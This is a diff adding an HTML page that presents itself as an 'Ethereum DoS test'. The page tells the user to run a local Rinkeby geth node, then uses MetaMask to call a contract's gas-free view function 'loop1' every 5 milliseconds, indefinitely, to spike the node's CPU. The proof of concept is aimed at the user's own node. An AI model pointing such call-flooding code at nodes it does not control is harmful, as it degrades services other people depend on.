@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+    <title>HTML Tutorial</title>
+
+    <body>
+
+        <h1>Ethereum Dos test</h1>
+        <p>Created by Tejasvi Nareddy</p>
+        <p>Only compatible with Metamask on the Rinkeby network. Please ensure you run geth and connect metamask to your local geth node.</p>
+        <br/>
+        <p>Geth command: geth --rinkeby --rpc --rpccorsdomain="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn"</p>
+        <p>Then switch metamask to connect to your local geth instance. Go ahead and click the button!</p>
+
+        <button onclick="myFunction()">Click to dos yourself :)</button>
+
+        <p id="demo"></p>
+        
+        <script type="text/javascript">
+
+            function myFunction() {
+
+                if (typeof web3 === 'undefined') {
+                    console.log('No web3? You should consider trying MetaMask!')
+                    document.getElementById("demo").innerHTML = "No web3 dectected :(";
+                    return;
+                }
+
+                // Found metamask! Note this doesn't work with mist cause we use the injected version
+                document.getElementById("demo").innerHTML = "Found web3! ";
+                web3js = new Web3(web3.currentProvider);
+
+                var abi = [{"constant":false,"inputs":[],"name":"stop","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"stopped","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"start","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"loop1","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}];
+                var dos = web3.eth.contract(abi).at("0x96c80720bb467b759d7b78a09b1f2579eafd2991");
+
+                // Succesfully constructed js object for dos
+                // Now we can spam the dos function :)
+
+                document.getElementById("demo").innerHTML += "Starting calls. Make sure to check your node's cpu usage. It should spike up (very briefly) in 5-10 seconds. Then it will go back down and repeat this spike.";
+
+                // Run at a set interval forever
+                window.setInterval(function() {
+
+                    // Make the call. Uses no gas
+                    dos.loop1.call(function(error, result) {
+                        // Metamask forces us to define a callback, just do nothing :/
+                        // console.log('Result:', result.toNumber());
+                    });
+                }, 5);
+
+            }
+        </script>
+
+        <noscript>Sorry, your browser does not support JavaScript!</noscript>
+
+    </body>
+    
+</html>
